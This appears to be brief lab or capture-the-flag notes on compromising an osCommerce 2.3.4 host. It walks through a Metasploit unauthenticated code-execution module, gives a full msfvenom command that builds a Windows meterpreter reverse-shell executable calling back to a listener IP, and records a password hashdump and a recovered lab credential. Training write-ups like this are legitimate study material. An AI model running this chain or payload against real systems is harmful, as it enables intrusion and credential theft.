### Enumeration
- PHP application `oscommerce-2.3.4`
	- https://www.exploit-db.com/exploits/44374
### Metasploit
- `exploit(multi/http/oscommerce_installer_unauth_code_exec`
- gain shell as php app user
### PrivEsc
- create meterpreter revshell executable with msfvenom
	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.25.82 LPORT=4443 -f exe > definitelynotabackdoor.exe`
- upload executable to target via previously established shell
- run metasploit listener `windows/meterpreter/reverse_tcp`
- gain shell and hashdump
- password for `Lab:googleplus`